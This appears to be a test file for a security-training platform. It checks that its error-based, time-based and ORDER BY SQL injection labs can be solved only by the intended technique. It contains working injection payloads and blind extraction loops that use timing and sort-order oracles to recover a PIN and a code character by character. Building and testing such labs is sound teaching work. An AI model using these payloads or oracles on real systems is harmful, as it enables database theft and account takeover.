import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { CookieClient } from "./helpers.js";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, jsonPost, launch } from "./lab-harness.js";

const form = (c: CookieClient, path: string, fields: Record<string, string>) =>
  c.fetch(path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString() });
const text = async (r: Response) => await r.text();

/**
 * Batch 2: injection labs. Same shape as batch 1: ordinary use and near-misses
 * must NOT solve; the intended technique solves exactly once. For the blind
 * labs the tests run a REAL extraction (timing / ordering oracle) character by
 * character, so each is proven solvable through its intended channel.
 */
describe("injection batch 2", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4140, labPortStart: 6900, labPortEnd: 6960 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("sqli-error-based: UNION and plain syntax errors leak nothing; a data-bearing error does", async () => {
    const lab = await launch(t, "sqli-error-based");
    const b = lab.browser();
    const xp0 = await lab.xp();
    const track = (ref: string) => b.fetch(`/track?ref=${encodeURIComponent(ref)}`);

    expect(await text(await track("NL-1001"))).toContain("In transit");
    expect(await text(await track("NOPE"))).toContain("No parcel found");

    const syntax = await track("NL-1001'");
    expect(syntax.status).toBe(500);
    const syntaxBody = await text(syntax);
    expect(syntaxBody).toContain("Database error");
    expect(syntaxBody).not.toContain("KEY-");

    const union = await text(await track("x' UNION SELECT api_key FROM staff --"));
    expect(union).toContain("Unknown"); // the data lands in the status column but only a fixed label is printed
    expect(union).not.toContain("KEY-");
    expect(await lab.solved()).toBe(false);

    const leak = await track("x' OR checked_int((SELECT api_key FROM staff WHERE username='ops'))>0 --");
    expect(leak.status).toBe(500);
    expect(await text(leak)).toMatch(/invalid input syntax for type integer: (?:"|&quot;)KEY-[A-Z2-9]{10}(?:"|&quot;)/); // quotes are HTML-escaped in the page
    await expectSolvedOnce(lab, "medium", () => track("x' OR checked_int((SELECT api_key FROM staff))>0 --"), xp0);
    await lab.stop();
  });

  it("sqli-time-based: identical answers, but a timing oracle recovers the PIN; guessing is locked out", async () => {
    const lab = await launch(t, "sqli-time-based");
    const b = lab.browser();
    const xp0 = await lab.xp();
    const sub = async (email: string) => {
      const t0 = Date.now();
      const r = await form(b, "/subscribe", { email });
      return { status: r.status, body: await text(r), ms: Date.now() - t0 };
    };

    // The page is the same for a hit, a miss, and a SQL error — only time can differ.
    const hit = await sub("reader@example.test");
    const miss = await sub("nobody@example.test");
    const broken = await sub("x'");
    expect(hit.body).toBe(miss.body);
    expect(hit.body).toBe(broken.body);
    expect([hit.status, miss.status, broken.status]).toEqual([200, 200, 200]);
    expect(hit.ms).toBeLessThan(400);

    // Timing oracle: SQLite evaluates the uncorrelated subquery once, so a true condition costs one 400 ms sleep.
    const oracle = async (cond: string) => (await sub(`x' OR (SELECT CASE WHEN (${cond}) THEN sleep_ms(400) ELSE 0 END)=-1 --`)).ms > 250;
    expect(await oracle("1=1")).toBe(true);
    expect(await oracle("1=2")).toBe(false);

    let pin = "";
    for (let i = 1; i <= 6; i++) {
      let lo = 0, hi = 9; // binary search the digit
      while (lo < hi) {
        const mid = Math.floor((lo + hi) / 2);
        if (await oracle(`CAST(substr((SELECT value FROM settings WHERE key='admin_pin'),${i},1) AS INTEGER) > ${mid}`)) lo = mid + 1;
        else hi = mid;
      }
      pin += String(lo);
    }
    expect(pin).toMatch(/^\d{6}$/);
    expect(await lab.solved()).toBe(false); // extracting alone is not the solve — submitting the PIN is

    const wrongPin = pin === "000000" ? "111111" : "000000";
    expect((await form(b, "/admin/unlock", { pin: wrongPin })).status).toBe(403);
    expect(await lab.solved()).toBe(false);
    const ok = await form(b, "/admin/unlock", { pin });
    expect(ok.status).toBe(200);
    expect(await text(ok)).toContain("Console unlocked");
    await expectSolvedOnce(lab, "advanced", () => form(b, "/admin/unlock", { pin }), xp0);
    await lab.stop();
  }, 90_000);

  it("sqli-time-based: ten wrong PIN guesses lock the console, so brute force is not an option", async () => {
    const lab = await launch(t, "sqli-time-based");
    const b = lab.browser();
    for (let i = 0; i < 10; i++) expect((await form(b, "/admin/unlock", { pin: String(100000 + i) })).status).toBe(403);
    expect((await form(b, "/admin/unlock", { pin: "123456" })).status).toBe(429);
    expect(await lab.solved()).toBe(false);
    await lab.stop();
  });

  it("sqli-order-by: UNION and errors leak nothing; a conditional sort key recovers the code", async () => {
    const lab = await launch(t, "sqli-order-by");
    const b = lab.browser();
    const xp0 = await lab.xp();
    const firstTitle = async (sort: string) => {
      const html = await text(await b.fetch(`/books?sort=${encodeURIComponent(sort)}`));
      return { html, first: /<tr><td>([^<]+)<\/td>/.exec(html)?.[1] };
    };

    expect((await firstTitle("title")).first).toBe("Algorithms Unlocked");
    expect((await firstTitle("price")).first).toBe("Cipher Notes");
    expect((await firstTitle("nonexistent_column")).html).toContain("Could not sort");
    expect((await firstTitle("title UNION SELECT code,code,0 FROM vault")).html).toContain("Could not sort"); // UNION cannot follow ORDER BY
    expect(await lab.solved()).toBe(false);

    // Ordering oracle: true => sorted by price (Cipher Notes first); false => by title (Algorithms first).
    const oracle = async (cond: string) => (await firstTitle(`(CASE WHEN (${cond}) THEN price ELSE title END)`)).first === "Cipher Notes";
    expect(await oracle("1=1")).toBe(true);
    expect(await oracle("1=2")).toBe(false);

    let code = "";
    for (let i = 1; i <= 6; i++) {
      let lo = 48, hi = 90; // '0'..'Z'
      while (lo < hi) {
        const mid = Math.floor((lo + hi) / 2);
        if (await oracle(`(SELECT unicode(substr(code,${i},1)) FROM vault) > ${mid}`)) lo = mid + 1;
        else hi = mid;
      }
      code += String.fromCharCode(lo);
    }
    expect(code).toMatch(/^[A-Z2-9]{6}$/);
    expect(await lab.solved()).toBe(false);

    expect((await form(b, "/claim", { code: code === "AAAAAA" ? "BBBBBB" : "AAAAAA" })).status).toBe(403);
    expect(await lab.solved()).toBe(false);
    expect((await form(b, "/claim", { code })).status).toBe(200);
    await expectSolvedOnce(lab, "hard", () => form(b, "/claim", { code }), xp0);
    await lab.stop();
  }, 90_000);

  // (more labs appended below)
  void formLogin;
  void jsonPost;
});
